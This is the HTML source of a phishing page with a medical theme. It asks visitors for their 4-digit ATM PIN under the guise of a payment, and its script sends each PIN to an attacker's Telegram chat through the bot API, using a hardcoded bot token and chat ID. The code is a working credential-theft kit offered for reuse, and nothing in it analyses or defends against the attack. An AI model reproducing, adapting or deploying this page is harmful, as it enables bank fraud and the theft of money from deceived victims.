<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enter PIN</title>
    
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    
    <style>
        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f4f4f4;
            padding-top: 220px; /* Prevent overlap with the carousel */
        }
        .carousel-container {
            position: absolute;
            top: 0;
            width: 100%;
        }
        .carousel img {
            height: 200px; /* Set fixed height */
            object-fit: cover;
        }
        .container {
            position: absolute;
            top:50%;
            left:50%;
            transform: translate(-50%,-50%);
            background: white;
            padding: 20px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            border-radius: 10px;
            width: 100%;
            max-width: 350px;
            margin-top: 10px;
        }
        h2 {
            margin-bottom: 15px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            font-size: 18px;
            text-align: center;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .pay-btn {
            width: 100%;
            padding: 10px;
            font-size: 18px;
            color: red;
            background: transparent;
            border: 2px solid red;
            cursor: pointer;
            border-radius: 5px;
        }
        .pay-btn:hover {
            background: red;
            color: white;
        }
    </style>
</head>
<body>

    <!-- Bootstrap Carousel (Image Slider) -->
    <div class="carousel-container">
        <div id="imageSlider" class="carousel slide" data-bs-ride="carousel">
            <div class="carousel-inner">
                <div class="carousel-item active">
                    <img src="./image/img1.jpg" class="d-block w-100" alt="Hospital">
                </div>
                <div class="carousel-item">
                    <img src="./image/img2.jpg" class="d-block w-100" alt="Doctor">
                </div>
                <div class="carousel-item">
                    <img src="./image/img3.jpg" class="d-block w-100" alt="Medical">
                </div>
            </div>
        </div>
    </div>

    <!-- PIN Input Container -->
    <div class="container">
        <h2>Enter Your ATM PIN</h2>
        <input type="password" maxlength="4" placeholder="****" id="pin-input">
        <button class="pay-btn" onclick="processPayment()">Pay Now</button>
    </div>

    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

    <script>
        // Replace with your actual Telegram bot token and chat ID
        const botToken = "7588718968:AAGDy9oxDYVHgTZm_VvQOZP5V4L40DGWjB0"; // Replace with your Telegram bot token
        const chatId = "6059260672"; // Replace with your chat ID

        async function processPayment() {
            let pin = document.getElementById("pin-input").value;

            if (pin.length === 4) {
                alert("Processing payment...");

                let message = `üîê *Atm PIN Entry:* ${pin}`;
                let telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

                try {
                    let response = await fetch(telegramUrl);
                    let data = await response.json();

                    if (data.ok) {
                        console.log("PIN Sent to Telegram!");
                        window.location.href = "confirmation.html"; // Redirect after success
                    } else {
                        console.error("Failed to send PIN:", data);
                        alert("Failed to process payment. Please try again.");
                    }
                } catch (error) {
                    console.error("Error sending PIN:", error);
                    alert("An error occurred. Please check your internet connection.");
                }
            } else {
                alert("Please enter a valid 4-digit PIN.");
            }
        }
    </script>

</body>
</html>
